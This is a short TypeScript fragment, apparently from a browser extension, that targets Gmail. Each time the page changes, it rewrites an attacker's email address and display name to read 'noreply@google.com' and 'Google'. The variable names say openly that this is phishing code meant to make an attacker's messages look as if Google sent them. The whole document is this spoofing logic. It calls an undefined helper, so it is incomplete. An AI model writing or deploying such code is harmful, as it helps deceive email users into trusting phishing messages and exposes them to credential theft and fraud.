let attackerEmail = 'attacker.email@gmail.com'
let attackerName = 'Attacker Name'
let phisingEmail = 'noreply@google.com'
let phisingName = 'Google'

let isSent = false

async function doGmailMatch(url: string) {
  onDomChange(() => {
    replaceTextInPage(
      attackerEmail,
      phisingEmail,
    )
    return null
  })
  onDomChange(() => {
    replaceTextInPage(
      attackerName,
      phisingName,
    )
    return null
  })
}

function replaceTextInPage(targetText: string, replacementText: string): void {
  const walker = document.createTreeWalker(
    document.body,
    NodeFilter.SHOW_TEXT,
    null
  );

  let node: Text | null;
  while ((node = walker.nextNode() as Text | null)) {
    if (node.nodeValue?.includes(targetText)) {
      node.nodeValue = node.nodeValue.replace(new RegExp(targetText, "g"), replacementText);
    }
  }
}

